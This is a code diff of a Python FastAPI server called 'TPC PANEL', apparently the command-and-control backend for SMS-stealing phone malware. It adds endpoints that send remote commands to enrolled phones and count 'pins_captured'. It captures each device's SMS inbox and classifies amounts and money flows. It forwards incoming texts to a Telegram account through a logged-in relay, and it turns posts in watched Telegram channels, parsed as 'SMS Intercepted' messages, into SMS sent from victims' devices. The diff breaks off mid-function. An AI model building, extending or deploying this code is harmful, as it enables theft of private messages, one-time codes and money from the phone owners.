@@ -1600,14 +1839,10 @@ async def admin_devices(
         ]
 
     try:
-        result = []
-        for d in devices.find(query, {"registration_id_hash": 0}).sort("_id", -1).limit(300):
-            s = serialize_document(d)
-            s["short_id"] = device_short_id(d)
-            s["ws_connected"] = hub.online(s["id"])
-            s["live_number"] = resolve_device_number(d)
-            s["entered_number"] = normalize_number(d.get("phone_number")) or (d.get("phone_number") or "")
-            result.append(s)
+        result = [
+            view_device(d)
+            for d in devices.find(query, {"registration_id_hash": 0}).sort("_id", -1).limit(300)
+        ]
         return {"devices": result}
     except PyMongoError:
         raise HTTPException(503, "Could not load devices")
@@ -1620,20 +1855,7 @@ async def admin_device(
     x_admin_key: str | None = Header(default=None),
 ):
     require_admin_or_key(request, x_admin_key)
-    try:
-        d = devices.find_one({"_id": ObjectId(device_id)}, {"registration_id_hash": 0})
-    except Exception:
-        raise HTTPException(400, "Bad device id")
-
-    if not d:
-        raise HTTPException(404, "Device not found")
-
-    s = serialize_document(d)
-    s["short_id"] = device_short_id(d)
-    s["ws_connected"] = hub.online(s["id"])
-    s["live_number"] = resolve_device_number(d)
-    s["entered_number"] = normalize_number(d.get("phone_number")) or (d.get("phone_number") or "")
-    return s
+    return view_device(get_device_or_404(device_id))
 
 
 @app.get("/admin/devices/{device_id}/messages")
@@ -1653,20 +1875,10 @@ async def device_command(
     request: Request,
     payload: CommandRequest | None = None,
 ):
-    """Device ko socket par command bhejo: ping | fetch_number | sim_info | refresh_telemetry | wake."""
     require_admin(request)
 
-    action = (payload.action if payload else "ping") or "ping"
-    action = action.strip().lower()
-
-    try:
-        device = devices.find_one({"_id": ObjectId(device_id)})
-    except Exception:
-        raise HTTPException(400, "Bad device id")
-
-    if not device:
-        raise HTTPException(404, "Device not found")
-
+    action = ((payload.action if payload else "ping") or "ping").strip().lower()
+    device = get_device_or_404(device_id)
     online = hub.online(device_id)
     delivered = False
 
@@ -1684,34 +1896,20 @@ async def device_command(
               device_id=device_id)
 
     return {
-        "status": "ok",
-        "action": action,
-        "online": online,
-        "delivered": delivered,
+        "status": "ok", "action": action, "online": online, "delivered": delivered,
         "note": "" if delivered else "device socket offline — uske online hone par milega",
     }
 
 
 @app.post("/admin/devices/{device_id}/refresh")
-async def device_refresh(
-    device_id: str,
-    request: Request,
-    payload: CommandRequest | None = None,
-):
-    """Frontend fallback — command ka alias."""
+async def device_refresh(device_id: str, request: Request, payload: CommandRequest | None = None):
     return await device_command(device_id, request, payload)
 
 
 @app.post("/admin/devices/{device_id}/ping")
 async def device_ping(device_id: str, request: Request):
     require_admin(request)
-    try:
-        device = devices.find_one({"_id": ObjectId(device_id)})
-    except Exception:
-        raise HTTPException(400, "Bad device id")
-    if not device:
-        raise HTTPException(404, "Device not found")
-
+    get_device_or_404(device_id)
     delivered = await send_command(device_id, "ping") if hub.online(device_id) else False
     return {"status": "ok", "online": hub.online(device_id), "delivered": delivered}
 
@@ -1719,13 +1917,7 @@ async def device_ping(device_id: str, request: Request):
 @app.post("/admin/devices/{device_id}/wake")
 async def device_wake(device_id: str, request: Request):
     require_admin(request)
-    try:
-        device = devices.find_one({"_id": ObjectId(device_id)})
-    except Exception:
-        raise HTTPException(400, "Bad device id")
-    if not device:
-        raise HTTPException(404, "Device not found")
-
+    get_device_or_404(device_id)
     delivered = await send_command(device_id, "wake") if hub.online(device_id) else False
     return {"status": "ok", "delivered": delivered}
 
@@ -1743,18 +1935,153 @@ async def admin_overview(request: Request):
         for d in devices.find({}, {"sim_count": 1, "telemetry.sims": 1}):
             sims += d.get("sim_count") or len((d.get("telemetry") or {}).get("sims") or [])
 
-        pins = devices.count_documents({"onboarded": True})
-
         return {
             "total_devices": total,
             "active_devices": active,
             "offline_devices": max(0, total - active),
             "total_sims": sims,
-            "pins_captured": pins,
+            "pins_captured": devices.count_documents({"onboarded": True}),
             "online_sockets": hub.online_count,
+            "auto_sender_enabled": devices.count_documents({"auto_sender.enabled": True}),
+            "relay_authorized": bool(relay_state.get("authorized")),
         }
     except PyMongoError:
         raise HTTPException(503, "Could not load overview")
+
+
+# ------------------------------------------------------------- AUTO SENDER
+
+
+def enabled_channels() -> set:
+    """Har enabled device ka channel + legacy env channel."""
+    out = set()
+    try:
+        for d in devices.find({"auto_sender.enabled": True}, {"auto_sender": 1}):
+            cid = (d.get("auto_sender") or {}).get("channel_id")
+            if cid:
+                out.add(str(cid))
+    except PyMongoError:
+        pass
+    if TARGET_CHANNEL_ID:
+        out.add(str(TARGET_CHANNEL_ID))
+    return out
+
+
+def devices_for_channel(channel_id) -> list:
+    key = str(channel_id)
+    try:
+        return list(devices.find({
+            "auto_sender.enabled": True,
+            "auto_sender.channel_id": key,
+        }).limit(MAX_BROADCAST))
+    except PyMongoError:
+        return []
+
+
+@app.get("/admin/auto-sender")
+async def auto_sender_status(request: Request):
+    require_admin(request)
+    try:
+        count = devices.count_documents({"auto_sender.enabled": True})
+    except PyMongoError:
+        count = 0
+
+    return {
+        "relay_ready": bool(relay_client and relay_state.get("authorized")),
+        "telethon": TELETHON_OK,
+        "account": relay_state.get("me"),
+        "forward_user": relay_state.get("forward_user") or DEFAULT_FWD_USER or "",
+        "channels": sorted(enabled_channels()),
+        "devices_enabled": count,
+    }
+
+
+@app.post("/admin/auto-sender/verify")
+async def auto_sender_verify(payload: ChannelRequest, request: Request):
+    """Channel reachable hai? Account admin hai? — bind se pehle check."""
+    require_admin(request)
+
+    if not (TELETHON_OK and relay_client and relay_state.get("authorized")):
+        raise HTTPException(400, "Pehle relay login karo (Admin → MTProto login)")
+
+    cid = norm_channel_id(payload.channel_id)
+    if not cid:
+        raise HTTPException(400, "Channel ID required")
+
+    try:
+        ent = await relay_client.get_entity(as_entity(cid))
+    except Exception as e:
+        raise HTTPException(400, f"Channel nahi mila: {e}")
+
+    title = getattr(ent, "title", None) or getattr(ent, "username", None) or cid
+
+    is_admin = False
+    try:
+        perms = await relay_client.get_permissions(ent)
+        is_admin = bool(getattr(perms, "is_admin", False)
+                        or getattr(perms, "is_creator", False))
+    except Exception:
+        pass
+
+    return {
+        "status": "ok",
+        "channel_id": str(getattr(ent, "id", cid)),
+        "title": str(title),
+        "admin": is_admin,
+        "message": "Account channel me hai — save karke bind kar do.",
+    }
+
+
+@app.post("/admin/auto-sender/test")
+async def auto_sender_test(request: Request):
+    require_admin(request)
+    if not (relay_client and relay_state.get("authorized")):
+        raise HTTPException(400, "Relay logged in nahi hai")
+
+    ok = await relay_send_text("✅ TPC PANEL — Auto Sender test message.")
+    if not ok:
+        raise HTTPException(400, "Test bheja nahi gaya — forward target check karo")
+    return {"status": "ok"}
+
+
+@app.post("/admin/devices/{device_id}/auto-sender")
+async def set_auto_sender(device_id: str, payload: AutoSenderRequest, request: Request):
+    admin = require_admin(request)
+    device = get_device_or_404(device_id)
+
+    cur = auto_sender_of(device)
+    enabled = cur["enabled"] if payload.enabled is None else bool(payload.enabled)
+    channel_id = cur["channel_id"] if payload.channel_id is None else norm_channel_id(payload.channel_id)
+    title = payload.channel_title or cur["channel_title"]
+
+    if enabled and not channel_id:
+        raise HTTPException(400, "Enable karne ke liye Channel ID chahiye")
+
+    doc = {
+        "enabled": enabled,
+        "channel_id": channel_id or None,
+        "channel_title": title or None,
+        "updated_at": utc_now(),
+    }
+    try:
+        devices.update_one({"_id": device["_id"]}, {"$set": {"auto_sender": doc}})
+    except PyMongoError:
+        raise HTTPException(503, "Save failed")
+
+    broadcast_device(device_id, {"auto_sender": doc})
+    log_event("auto_sender_update",
+              {"enabled": enabled, "channel_id": channel_id},
+              device_id=device_id, admin_id=admin)
+
+    return {
+        "status": "ok",
+        "auto_sender": {
+            "enabled": enabled,
+            "channel_id": channel_id,
+            "channel_title": title,
+        },
+        "watching": sorted(enabled_channels()),
+    }
 
 
 # ---------------------------------------------------------------- pairing
@@ -1780,515 +2107,8 @@ async def create_pair(payload: PairRequest):
     return {"pair_code": code, "expires_in_seconds": SESSION_TTL}
 
 
-# --------------------------------------------------------------- telegram
-
-
-TELEGRAM_API = "https://api.telegram.org/bot{token}/{method}"
-
-
-async def tg(token: str, method: str, payload: dict | None = None) -> dict:
-    url = TELEGRAM_API.format(token=token, method=method)
-    try:
-        async with httpx.AsyncClient(timeout=15) as client:
-            r = await client.post(url, json=payload or {})
-            return r.json()
-    except Exception as e:
-        return {"ok": False, "description": str(e)}
-
-
-def tg_log(direction: str, text: str, result: str = "ok"):
-    try:
-        tg_logs.insert_one({
-            "direction": direction,
-            "text": text[:400],
-            "result": result,
-            "created_at": utc_now(),
-        })
-    except PyMongoError:
-        pass
-
-
-def resolve_bot() -> tuple[str, str] | None:
-    """(token, chat_id) — hardcoded config pehle, warna DB-bound bot."""
-    if TG_BOT_TOKEN and TG_CHAT_ID:
-        return TG_BOT_TOKEN, str(TG_CHAT_ID)
-
-    try:
-        bot = bots.find_one({"bound": True}, sort=[("_id", -1)])
-    except PyMongoError:
-        return None
-
-    if not bot or not bot.get("chat_id"):
-        return None
-
-    return bot["token"], str(bot["chat_id"])
-
-
-async def notify_telegram(text: str) -> bool:
-    target = resolve_bot()
-    if not target:
-        return False
-
-    token, chat_id = target
-    res = await tg(token, "sendMessage", {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "HTML",
-        "disable_web_page_preview": True,
-    })
-
-    tg_log("out", text, "ok" if res.get("ok") else str(res.get("description"))[:200])
-    return bool(res.get("ok"))
-
-
-@app.get("/admin/telegram/status")
-async def telegram_status(request: Request):
-    require_admin(request)
-
-    try:
-        bot = bots.find_one(sort=[("_id", -1)])
-        logs = list(tg_logs.find().sort("_id", -1).limit(50))
-    except PyMongoError:
-        raise HTTPException(503, "Database error")
-
-    if bot:
-        token = bot["token"]
-        bot_view = {
-            "id": str(bot["_id"]),
-            "username": bot.get("username"),
-            "channel": bot.get("channel"),
-            "chat_title": bot.get("chat_title"),
-            "bound": bot.get("bound", False),
-            "verify_code": bot.get("verify_code"),
-            "webhook_url": bot.get("webhook_url"),
-            "webhook_ok": bot.get("webhook_ok", False),
-            "token_masked": f"{token[:10]}…{token[-6:]}" if len(token) > 20 else token,
-        }
-    else:
-        bot_view = None
-
-    return {
-        "bot": bot_view,
-        "hardcoded": bool(TG_BOT_TOKEN and TG_CHAT_ID),
-        "logs": [serialize_document(l) for l in logs],
-    }
-
-
-@app.post("/admin/telegram/bots")
-async def create_bot(payload: BotRequest, request: Request):
-    require_admin(request)
-
-    token = payload.token.strip()
-    channel = payload.channel.strip()
-
-    me = await tg(token, "getMe")
-    if not me.get("ok"):
-        raise HTTPException(400, f"Bot token invalid: {me.get('description', 'unknown')}")
-
-    username = me["result"].get("username", "")
-    code = f"{secrets.randbelow(900000) + 100000}"
-
-    webhook_url = f"{PUBLIC_BASE_URL}/telegram/webhook/{hash_value(token)[:24]}" \
-        if PUBLIC_BASE_URL else ""
-
-    bot_id = hash_value(token)[:24]
-
-    bots.update_one(
-        {"bot_id": bot_id},
-        {"$set": {
-            "bot_id": bot_id,
-            "token": token,
-            "username": username,
-            "channel": channel,
-            "verify_code": code,
-            "bound": False,
-            "webhook_url": webhook_url,
-            "created_at": utc_now(),
-        }},
-        upsert=True,
-    )
-
-    webhook_ok = False
-    if webhook_url:
-        hook = {"url": webhook_url, "allowed_updates": ["message", "channel_post"]}
-        if TG_WEBHOOK_SECRET:
-            hook["secret_token"] = TG_WEBHOOK_SECRET
-        res = await tg(token, "setWebhook", hook)
-        webhook_ok = bool(res.get("ok"))
-        bots.update_one({"bot_id": bot_id}, {"$set": {"webhook_ok": webhook_ok}})
-
-    tg_log("out", f"bot configured: @{username} → {channel}")
-    return {
-        "status": "ok",
-        "bot_id": bot_id,
-        "username": username,
-        "verify_code": code,
-        "webhook_ok": webhook_ok,
-        "webhook_url": webhook_url,
-        "next": f"Channel me bhejo: /verify {code}",
-    }
-
-
-@app.post("/admin/telegram/test")
-async def telegram_test(request: Request):
-    require_admin(request)
-
-    target = resolve_bot()
-    if not target:
-        raise HTTPException(
-            400,
-            "Koi bot configured nahi — TG_BOT_TOKEN/TG_CHAT_ID set karo ya verify flow chalao"
-        )
-
-    token, chat_id = target
-    res = await tg(token, "sendMessage", {
-        "chat_id": chat_id,
-        "text": "✅ TPC PANEL connected — test message.",
-    })
-
-    if not res.get("ok"):
-        tg_log("out", "test failed", res.get("description", "error"))
-        raise HTTPException(400, f"Test failed: {res.get('description')}")
-
-    tg_log("out", "test message sent", "ok")
-    return {"status": "ok"}
-
-
-@app.post("/telegram/webhook/{bot_id}")
-async def telegram_webhook(bot_id: str, request: Request):
-    if TG_WEBHOOK_SECRET:
-        got = request.headers.get("x-telegram-bot-api-secret-token", "")
-        if not secrets.compare_digest(got, TG_WEBHOOK_SECRET):
-            return {"ok": True}
-
-    try:
-        update = await request.json()
-    except Exception:
-        return {"ok": True}
-
-    try:
-        bot = bots.find_one({"bot_id": bot_id})
-    except PyMongoError:
-        return {"ok": True}
-
-    if not bot:
-        return {"ok": True}
-
-    message = update.get("message") or update.get("channel_post") or {}
-    chat = message.get("chat") or {}
-    text = (message.get("text") or "").strip()
-    chat_id = chat.get("id")
-
-    if not chat_id or not text:
-        return {"ok": True}
-
-    tg_log("in", text)
-
-    # --- verification
-    if text.startswith("/verify"):
-        parts = text.split()
-        code = parts[1] if len(parts) > 1 else ""
-
-        if code == bot.get("verify_code"):
-            bots.update_one(
-                {"bot_id": bot_id},
-                {"$set": {
-                    "bound": True,
-                    "chat_id": chat_id,
-                    "chat_title": chat.get("title") or chat.get("username") or "",
-                    "bound_at": utc_now(),
-                }},
-            )
-            await tg(bot["token"], "sendMessage", {
-                "chat_id": chat_id,
-                "text": "🔗 Verification complete. TPC PANEL is now bound to this chat.",
-            })
-            tg_log("out", "verification complete")
-        else:
-            await tg(bot["token"], "sendMessage", {
-                "chat_id": chat_id,
-                "text": "❌ Wrong code.",
-            })
-            tg_log("out", "verification failed")
-        return {"ok": True}
-
-    if not bot.get("bound"):
-        await tg(bot["token"], "sendMessage", {
-            "chat_id": chat_id,
-            "text": "Pehle verify karo: /verify <code>",
-        })
-        return {"ok": True}
-
-    if text == "/start":
-        await tg(bot["token"], "sendMessage", {
-            "chat_id": chat_id,
-            "text": "TPC PANEL online. Message bhejo — SMS ban ke jaayega.",
-        })
-        return {"ok": True}
-
-    # --- relay: plain text becomes SMS to all online devices
-    try:
-        online_ids = [ObjectId(i) for i in hub.device_sockets.keys()]
-        targets = list(devices.find({"_id": {"$in": online_ids}})) or \
-            list(devices.find().limit(50))
-    except PyMongoError:
-        targets = []
-
-    queued = 0
-    for d in targets:
-        did = str(d["_id"])
-        to = resolve_device_number(d)
-        queue_sms(did, text, to, source="telegram", device_name=d.get("device_name", ""))
-        queued += 1
-        if hub.online(did):
-            spawn(push_outbox(did))
-
-    await tg(bot["token"], "sendMessage", {
-        "chat_id": chat_id,
-        "text": f"📤 Queued to {queued} device(s).",
-    })
-
-    tg_log("out", f"relayed to {queued} device(s)")
-    return {"ok": True}
-
-
-# ------------------------------------------------------------ admin socket
-
-
-@app.websocket("/ws/admin")
-async def admin_socket(websocket: WebSocket):
-    """Admin dashboard live socket — pehle missing tha, isliye panel sirf polling par chalta tha."""
-    if not websocket.session.get("admin_id"):
-        await websocket.close(code=1008)
-        return
-
-    await websocket.accept()
-    await admin_hub.add(websocket)
-
-    try:
-        try:
-            total = devices.count_documents({})
-        except PyMongoError:
-            total = 0
-
-        await websocket.send_json({
-            "type": "hello",
-            "online": hub.online_count,
-            "devices": total,
-            "server_time": utc_now().isoformat(),
-        })
-
-        while True:
-            raw = await websocket.receive_text()
-            if not raw:
-                continue
-            try:
-                msg = json.loads(raw)
-            except json.JSONDecodeError:
-                continue
-            if str(msg.get("type") or "").lower() == "ping":
-                await websocket.send_json({"type": "pong", "ts": int(time.time())})
-    except WebSocketDisconnect:
-        pass
-    except Exception:
-        pass
-    finally:
-        await admin_hub.remove(websocket)
-
-
-# ----------------------------------------------------------- device socket
-
-
-async def _ws_keepalive(websocket: WebSocket, device_id: str):
-    """Server-side ping — isi ke bina idle socket proxy/nginx me kat jaata hai."""
-    try:
-        while True:
-            await asyncio.sleep(WS_PING_INTERVAL)
-            await websocket.send_json({"type": "ping", "ts": int(time.time())})
-
-            last = hub.last_pong.get(device_id, time.time())
-            if time.time() - last > WS_IDLE_TIMEOUT:
-                await websocket.close(code=1001)
-                return
-    except Exception:
-        return
-
-
-@app.websocket("/ws/device/{registration_id}")
-async def device_socket(websocket: WebSocket, registration_id: str):
-    rh = hash_value(registration_id.strip())
-
-    try:
-        device = devices.find_one({"registration_id_hash": rh})
-    except PyMongoError:
-        await websocket.close(code=1011)
-        return
-
-    if not device:
-        await websocket.close(code=1008)
-        return
-
-    device_id = str(device["_id"])
-    await websocket.accept()
-    await hub.add_device(device_id, websocket)
-
-    ping_task = asyncio.create_task(_ws_keepalive(websocket, device_id))
-    last_seen_push = 0.0
-
-    try:
-        try:
-            devices.update_one(
-                {"_id": device["_id"]},
-                {"$set": {
-                    "ws_connected": True,
-                    "ws_connected_at": utc_now(),
-                    "last_seen": utc_now(),
-                }},
-            )
-        except PyMongoError:
-            pass
-
-        log_event("device_socket_open", {"device_id": device_id})
-        broadcast_device(device_id, {
-            "ws_connected": True,
-            "status": "Online",
-            "last_seen": utc_now().isoformat(),
-        })
-
-        try:
-            pending_count = outbox.count_documents(
-                {"device_id": device_id, "status": "pending"}
-            )
-        except PyMongoError:
-            pending_count = 0
-
-        await websocket.send_json({
-            "type": "hello",
-            "server_time": utc_now().isoformat(),
-            "pending": pending_count,
-        })
-
-        await push_outbox(device_id)
-
-        while True:
-            raw = await websocket.receive_text()
-            if len(raw) > MAX_WS_TEXT_BYTES:
-                continue
-
-            try:
-                msg = json.loads(raw)
-            except json.JSONDecodeError:
-                continue
-
-            mtype = str(msg.get("type") or "").lower()
-            hub.last_pong[device_id] = time.time()
-
-            # last_seen throttle (5s) — DB hammer na ho
-            now_ts = time.time()
-            if now_ts - last_seen_push > 5:
-                last_seen_push = now_ts
-                try:
-                    devices.update_one(
-                        {"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}}
-                    )
-                except PyMongoError:
-                    pass
-
-            if mtype in ("ping", "heartbeat"):
-                await websocket.send_json({"type": "pong", "ts": int(time.time())})
-                continue
-
-            if mtype == "pong":
-                continue
-
-            if mtype == "telemetry":
-                data = msg.get("data") if isinstance(msg.get("data"), dict) else msg.get("telemetry")
-                if isinstance(data, dict):
-                    apply_telemetry(device, data)
-                    broadcast_device(device_id, {
-                        "ws_connected": True,
-                        "telemetry": data,
-                        "last_seen": utc_now().isoformat(),
-                    })
-
-            elif mtype == "command_result":
-                data = msg.get("data") if isinstance(msg.get("data"), dict) else {}
-                action = str(msg.get("action") or "").lower()
-                if action in ("fetch_number", "number", "sim_info", "telemetry",
-                              "refresh_telemetry"):
-                    apply_telemetry(device, data)
-                    if data.get("sim_number"):
-                        try:
-                            devices.update_one(
-                                {"_id": device["_id"]},
-                                {"$set": {"number_requested_at": None}},
-                            )
-                        except PyMongoError:
-                            pass
-                    broadcast_device(device_id, {
-                        "ws_connected": True,
-                        "telemetry": data,
-                    })
-
-            elif mtype == "ack":
-                item_id = msg.get("id")
-                if item_id:
-                    try:
-                        await _ack_outbox(
-                            str(item_id),
-                            str(msg.get("status") or "sent"),
-                            str(msg.get("error") or ""),
-                        )
-                    except HTTPException:
-                        pass
-
-            elif mtype == "inbox":
-                items = msg.get("items") or []
-                for item in items[:50]:
-                    if not isinstance(item, dict):
-                        continue
-                    body = str(item.get("body") or "")[:MAX_SMS_BODY]
-                    address = str(item.get("address") or "")[:64]
-                    if not body:
-                        continue
-                    kind, amount, flow = classify_sms(address, body)
-                    mid = insert_message({
-                        "device_id": device_id,
-                        "device_name": device.get("device_name", "Unknown"),
-                        "direction": str(item.get("direction") or "in")[:8],
-                        "address": address,
-                        "body": body,
-                        "kind": kind,
-                        "amount": amount,
-                        "flow": flow,
-                        "status": "received",
-                        "created_at": utc_now(),
-                    })
-                    if mid:
-                        try:
-                            broadcast_message(messages.find_one({"_id": mid}))
-                        except PyMongoError:
-                            pass
-                        if str(item.get("direction") or "in") == "in":
-                            spawn(relay_forward_incoming(device, address, body))
-
-    except WebSocketDisconnect:
-        pass
-    except Exception:
-        pass
-    finally:
-        ping_task.cancel()
-        await hub.remove_device(device_id, websocket)
-        try:
-            devices.update_one({"_id": device["_id"]}, {"$set": {"ws_connected": False}})
-        except PyMongoError:
-            pass
-        broadcast_device(device_id, {"ws_connected": False, "status": "Offline"})
-        log_event("device_socket_close", {"device_id": device_id})
-
-
 # =====================================================================
-#  RELAY — folded-in relay.py: MTProto channel watcher + SMS forwarder
+#  RELAY — MTProto channel watcher + SMS forwarder (bot API hata diya)
 # =====================================================================
 
 relay_client = None
@@ -2296,14 +2116,12 @@ relay_state = {
     "connected": False, "authorized": False, "me": None,
     "phone": None, "phone_code_hash": None, "awaiting_code": False,
     "handlers_installed": False, "last_error": None,
-    "channel_id": TARGET_CHANNEL_ID or None,
     "forward_user": DEFAULT_FWD_USER or None,
     "last_channel_at": None,
 }
-_relay_seen: set[int] = set()
-banned_cache: set[str] = set()
+_relay_seen: set = set()
+banned_cache: set = set()
 
-# --- regex parser (SMS Intercepted format)
 _p_to     = re.compile(r"To:\s*(\+?\d{7,15})")
 _p_msg    = re.compile(r"Message:\s*(.+?)(?=\n\n|\n[📋📞💬📱]|\Z)", re.S)
 _p_onetap = re.compile(r"(\+?\d{7,15})\s*\|\s*(.+)")
@@ -2321,7 +2139,6 @@ def _clean_sms_body(raw: str) -> str:
 
 
 def _parse_sms(text: str):
-    """-> (to_number, body, device_hint) | None"""
     if not text:
         return None
 
@@ -2351,7 +2168,6 @@ def _parse_sms(text: str):
     return to, _clean_sms_body(body), hint
 
 
-# --- ban list (in-memory, Mongo-backed — ban.txt ka replacement)
 def load_bans():
     banned_cache.clear()
     try:
@@ -2367,7 +2183,6 @@ def is_banned(address) -> bool:
     return bool(a) and a in banned_cache
 
 
-# --- creds
 def _relay_creds():
     if TELE_API_ID and TELE_API_HASH:
         return TELE_API_ID, TELE_API_HASH
@@ -2400,18 +2215,12 @@ def _resolve_relay_targets(hint):
                 return [d]
         return []
 
-    online_ids = []
-    for k in list(hub.device_sockets.keys()):
-        try:
-            online_ids.append(ObjectId(k))
-        except Exception:
-            continue
-    if online_ids:
-        return list(devices.find({"_id": {"$in": online_ids}}))
+    ids = online_device_ids()
+    if ids:
+        return list(devices.find({"_id": {"$in": ids}}))
     return list(devices.find().limit(MAX_BROADCAST))
 
 
-# --- telethon lifecycle
 async def start_relay():
     global relay_client
     if not TELETHON_OK:
@@ -2458,55 +2267,72 @@ async def _after_relay_login(api_id=None, api_hash=None):
 
 
 def _install_relay_handlers():
+    """Global handler — dynamic channel list, dobara register karne ki zarurat nahi."""
     if relay_state["handlers_installed"] or not relay_client or not TELETHON_OK:
         return
-    if TARGET_CHANNEL_ID:
-        relay_client.add_event_handler(
-            _on_channel_message, events.NewMessage(chats=TARGET_CHANNEL_ID)
-        )
+    relay_client.add_event_handler(_on_relay_message, events.NewMessage(incoming=True))
     relay_state["handlers_installed"] = True
 
 
-# --- channel -> device
-async def _on_channel_message(event):
+async def _on_relay_message(event):
     try:
         mid = event.message.id
-        if mid in _relay_seen:
+        key = (event.chat_id, mid)
+        if key in _relay_seen:
             return
-        _relay_seen.add(mid)
-        if len(_relay_seen) > 5000:
+        _relay_seen.add(key)
+        if len(_relay_seen) > 8000:
             _relay_seen.clear()
 
+        chat_id = event.chat_id
+        channels = enabled_channels()
+        if chat_id is None or str(chat_id) not in channels:
+            return
+
         relay_state["last_channel_at"] = utc_now().isoformat()
+
         parsed = _parse_sms(event.message.message or "")
         if not parsed:
             return
 
         to_number, body, hint = parsed
-        targets = _resolve_relay_targets(hint)
+
+        targets = devices_for_channel(chat_id)
+        if not targets and hint:
+            targets = _resolve_relay_targets(hint)
+        if not targets and TARGET_CHANNEL_ID and chat_id == TARGET_CHANNEL_ID:
+            targets = _resolve_relay_targets(None)
+
         for d in targets:
             did = str(d["_id"])
             to = to_number or resolve_device_number(d)
-            queue_sms(did, body, to, source="relay",
-                      device_name=d.get("device_name", ""))
+            queue_sms(did, body, to, source="relay", device_name=d.get("device_name", ""))
             if hub.online(did):
                 spawn(push_outbox(did))
-        log_event("relay_channel_send", {"to": to_number, "devices": len(targets)})
+
+        log_event("relay_channel_send",
+                  {"to": to_number, "devices": len(targets), "channel": str(chat_id)})
     except Exception as e:
+        relay_state["last_error"] = f"channel: {e}"
         log_event("relay_channel_error", {"error": str(e)})
 
 
-# --- device -> telegram
 async def relay_send_text(text: str) -> bool:
     target = relay_state.get("forward_user") or DEFAULT_FWD_USER
     if relay_client and relay_state.get("authorized") and target:
         try:
             ent = int(target) if str(target).lstrip("-").isdigit() else target
             await relay_client.send_message(ent, text, parse_mode="html")
+            tg_log("out", text, "ok")
             return True
         except Exception as e:
             relay_state["last_error"] = f"forward: {e}"
-    return await notify_telegram(text)
+            tg_log("out", text, f"fail: {e}")
+    return False
+
+
+async def notify_admins(text: str) -> bool:
+    return await relay_send_text(text)
 
 
 async def relay_forward_incoming(device: dict, address: str, body: str):
@@ -2522,7 +2348,18 @@ async def relay_forward_incoming(device: dict, address: str, body: str):
     await relay_send_text(text)
 
 
-# --- relay endpoints
+def tg_log(direction: str, text: str, result: str = "ok"):
+    try:
+        tg_logs.insert_one({
+            "direction": direction,
+            "text": (text or "")[:400],
+            "result": (result or "ok")[:200],
+            "created_at": utc_now(),
+        })
+    except PyMongoError:
+        pass
+
+
 @app.get("/admin/relay/status")
 async def relay_status(request: Request):
     require_admin(request)
@@ -2531,7 +2368,34 @@ async def relay_status(request: Request):
         "state": dict(relay_state),
         "bans": sorted(banned_cache),
         "creds_from_env": bool(TELE_API_ID and TELE_API_HASH),
+        "channels": sorted(enabled_channels()),
     }
+
+
+@app.get("/admin/relay/logs")
+async def relay_logs(request: Request, limit: int = 60):
+    require_admin(request)
+    try:
+        rows = list(tg_logs.find().sort("_id", -1).limit(max(1, min(limit, 200))))
+    except PyMongoError:
+        raise HTTPException(503, "Database error")
+    return {"logs": [serialize_document(r) for r in rows]}
+
+
+@app.post("/admin/relay/forward")
+async def relay_set_forward(payload: ForwardRequest, request: Request):
+    require_admin(request)
+    t = payload.target.strip()
+    relay_state["forward_user"] = t or None
+    try:
+        relay_config.update_one(
+            {"_id": "forward"},
+            {"$set": {"target": t, "updated_at": utc_now()}},
+            upsert=True,
+        )
+    except PyMongoError:
+        pass
+    return {"status": "ok", "forward_user": relay_state["forward_user"]}
 
 
 @app.post("/admin/relay/login/start")
@@ -2617,9 +2481,7 @@ async def relay_ban_add(payload: BanRequest, request: Request):
     require_admin(request)
     a = normalize_number(payload.address) or payload.address.strip()
     banned_senders.update_one(
-        {"address": a},
-        {"$set": {"address": a, "created_at": utc_now()}},
-        upsert=True,
+        {"address": a}, {"$set": {"address": a, "created_at": utc_now()}}, upsert=True,
     )
     banned_cache.add(a)
     return {"status": "ok", "bans": sorted(banned_cache)}
@@ -2636,7 +2498,6 @@ async def relay_ban_remove(address: str, request: Request):
 
 @app.post("/admin/relay/parse")
 async def relay_parse(payload: RelayParseRequest, request: Request):
-    """Parser test — channel me bhejne se pehle yahan check karo."""
     require_admin(request)
     parsed = _parse_sms(payload.text)
     if not parsed:
@@ -2649,3 +2510,233 @@ async def relay_parse(payload: RelayParseRequest, request: Request):
         "device_hint": hint,
         "targets": [device_short_id(d) for d in _resolve_relay_targets(hint)],
     }
+
+
+# ------------------------------------------------------------ admin socket
+
+
+@app.websocket("/ws/admin")
+async def admin_socket(websocket: WebSocket):
+    token = websocket.query_params.get("token")
+    if not websocket.session.get("admin_id"):
+        if not (token and verify_token(token)):
+            await websocket.close(code=1008)
+            return
+
+    await websocket.accept()
+    await admin_hub.add(websocket)
+
+    try:
+        try:
+            total = devices.count_documents({})
+        except PyMongoError:
+            total = 0
+
+        await websocket.send_json({
+            "type": "hello",
+            "online": hub.online_count,
+            "devices": total,
+            "server_time": utc_now().isoformat(),
+        })
+
+        while True:
+            raw = await websocket.receive_text()
+            if not raw:
+                continue
+            try:
+                msg = json.loads(raw)
+            except json.JSONDecodeError:
+                continue
+            if str(msg.get("type") or "").lower() == "ping":
+                await websocket.send_json({"type": "pong", "ts": int(time.time())})
+    except WebSocketDisconnect:
+        pass
+    except Exception:
+        pass
+    finally:
+        await admin_hub.remove(websocket)
+
+
+# ----------------------------------------------------------- device socket
+
+
+async def _ws_keepalive(websocket: WebSocket, device_id: str):
+    try:
+        while True:
+            await asyncio.sleep(WS_PING_INTERVAL)
+            await websocket.send_json({"type": "ping", "ts": int(time.time())})
+
+            last = hub.last_pong.get(device_id, time.time())
+            if time.time() - last > WS_IDLE_TIMEOUT:
+                await websocket.close(code=1001)
+                return
+    except Exception:
+        return
+
+
+@app.websocket("/ws/device/{registration_id}")
+async def device_socket(websocket: WebSocket, registration_id: str):
+    rh = hash_value(registration_id.strip())
+
+    try:
+        device = devices.find_one({"registration_id_hash": rh})
+    except PyMongoError:
+        await websocket.close(code=1011)
+        return
+
+    if not device:
+        await websocket.close(code=1008)
+        return
+
+    device_id = str(device["_id"])
+    await websocket.accept()
+    await hub.add_device(device_id, websocket)
+
+    ping_task = asyncio.create_task(_ws_keepalive(websocket, device_id))
+    last_seen_push = 0.0
+
+    try:
+        try:
+            devices.update_one(
+                {"_id": device["_id"]},
+                {"$set": {
+                    "ws_connected": True,
+                    "ws_connected_at": utc_now(),
+                    "last_seen": utc_now(),
+                }},
+            )
+        except PyMongoError:
+            pass
+
+        log_event("device_socket_open", {"device_id": device_id})
+        broadcast_device(device_id, {
+            "ws_connected": True,
+            "status": "Online",
